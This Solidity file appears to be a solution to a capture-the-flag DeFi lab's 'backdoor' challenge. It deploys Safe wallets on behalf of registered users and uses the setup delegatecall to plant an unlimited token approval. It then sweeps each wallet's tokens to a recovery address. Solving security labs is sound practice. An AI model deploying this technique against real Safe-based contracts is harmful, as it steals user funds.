// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract ImpAttack {
    function attack(address token, address spender) external {
        ERC20(token).approve(spender, type(uint256).max);
    }
}

contract AttackBackdoor {
    constructor(
        address _factory,
        address _singleton,
        address _walletRegistry,
        address[] memory _users,
        address _token,
        address _recovery
    ) {
        ImpAttack impAttack = new ImpAttack();
        bytes memory initializer;
        for (uint256 i = 0; i < _users.length; i++) {
            address[] memory users = new address[](1);
            users[0] = _users[i];
            initializer = abi.encodeCall(
                Safe.setup,
                (
                    users,
                    1,
                    address(impAttack),
                    abi.encodeCall(ImpAttack.attack, (_token, address(this))),
                    address(0),
                    address(0),
                    0,
                    payable(0)
                )
            );
            SafeProxyFactory factory = SafeProxyFactory(_factory);
            address proxy =
                address(factory.createProxyWithCallback(_singleton, initializer, 0, WalletRegistry(_walletRegistry)));

            ERC20(_token).transferFrom(proxy, _recovery, ERC20(_token).balanceOf(proxy));
        }
    }
}
